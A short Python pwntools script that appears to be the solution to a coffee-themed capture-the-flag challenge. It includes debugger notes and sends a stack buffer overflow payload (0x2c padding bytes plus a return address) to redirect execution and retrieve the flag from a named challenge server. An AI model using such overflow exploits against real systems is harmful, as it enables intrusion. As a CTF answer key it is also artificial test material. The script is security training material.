from pwn import *

def solution(host: str, port: str) -> str:
    r'''
    pwndbg> print brew_coffee
    -> 0x804856b
    pwndbg> b *order_coffee+41
    pwndbg> r
    -> <order_coffee+41> lea eax, [ebp - 0x28] -> address distance = 0x28 + SFP(0x4) = 0x2c
    '''
    flag = ""
    context.update({"arch":"i386","log_level":"error"})
    with remote(host, port) as r:
        r.recvuntil(b"Barista: 'What will you have?'")
        r.sendline(b"A" * 0x2c + p32(0x804856b))
        r.recvuntil(b"Barista: 'A rare choice... here is your secret blend.'")
        flag = r.recvall().decode().strip()
    return flag

if __name__ == "__main__":
    host = "chals1.apoorvctf.xyz"
    port = "3001"
    print(solution(host, port))
    